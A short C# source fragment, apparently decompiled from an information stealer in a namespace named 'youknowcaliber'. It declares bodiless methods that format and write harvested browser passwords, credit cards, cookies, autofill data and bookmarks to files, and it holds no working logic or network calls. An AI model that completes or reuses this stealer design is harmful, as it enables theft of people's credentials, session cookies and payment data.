using System.Collections.Generic;

namespace youknowcaliber;

internal sealed class cBrowserUtils
{
	private static extern string FormatPassword(Password pPassword);

	private static extern string FormatCreditCard(CreditCard cCard);

	private static extern string FormatCookie(Cookie cCookie);

	private static extern string FormatAutoFill(AutoFill aFill);

	private static extern string FormatBookmark(Bookmark bBookmark);

	public static extern bool WriteCookies(List<Cookie> cCookies, string sFile);

	public static extern bool WriteAutoFill(List<AutoFill> aFills, string sFile);

	public static extern bool WriteBookmarks(List<Bookmark> bBookmarks, string sFile);

	public static extern bool WritePasswords(List<Password> pPasswords, string sFile);

	public static extern bool WriteCreditCards(List<CreditCard> cCC, string sFile);

	public extern cBrowserUtils();
}
